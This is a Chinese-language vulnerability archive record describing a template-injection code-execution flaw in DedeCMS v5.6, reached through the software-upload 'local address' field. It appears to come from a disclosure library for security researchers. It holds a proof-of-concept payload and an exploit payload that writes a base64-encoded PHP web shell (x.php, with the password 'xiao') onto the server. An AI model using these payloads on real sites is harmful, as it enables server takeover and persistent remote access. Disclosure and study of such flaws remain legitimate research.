---
source: "MrWQ/vulnerability-paper"
product: "DedeCMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "DedeCms v5-6 嵌入恶意代码执行漏洞 - 白阁文库"
prerequisites: "来源所述条件，未列明部分仍待核：5.6; registered member uploads software local-address; old PHP/template semantics"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
id: "vw-32fc61b59beb6f9a48b29651"
entity_id: "ve-32fc61b59beb6f9a48b29651"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.6; registered member uploads software local-address; old PHP/template semantics

- **适用与权限边界（1）**：Literal name\= in fenced code is suspicious conversion escape and unquoted base64/constants require legacy PHP。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：No HTTP request, source sink or output proof; Seebug original precise。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：PHP payload writes shell in unspecified working directory; not verified here。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# DedeCms v5-6 嵌入恶意代码执行漏洞 - 白阁文库

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.bylibrary.cn](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)

> 白阁文库是白泽 Sec 团队维护的一个漏洞 POC 和 EXP 披露以及漏洞复现的开源项目，欢迎各位白帽子访问白阁文库并提出宝贵建议。

[](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md "编辑此页")

漏洞简介 [¶](#_1 "Permanent link")
------------------------------

在上传软件的地方，对本地地址没有进行有效的验证，可以被恶意利用。

影响版本 [¶](#_2 "Permanent link")
------------------------------

DedeCms v5.6

复现 [¶](#_3 "Permanent link")
----------------------------

注册会员，上传软件：本地地址中填入如下：

### POC[¶](#poc "Permanent link")

```
a{/dede:link}{dede:toby57 name\="']=0;phpinfo();//"}x{/dede:toby57}，
```

发表后查看或修改即可执行。

### EXP[¶](#exp "Permanent link")

```
a{/dede:link}{dede:toby57 name\="']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//"}x{/dede:toby57}
```

生成 x.php 密码：xiao 直接生成一句话。

参考 [¶](#_4 "Permanent link")
----------------------------

知道创宇：[https://www.seebug.org/vuldb/ssvid-20352](https://www.seebug.org/vuldb/ssvid-20352)

* * *

最后更新: 2021-03-24

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
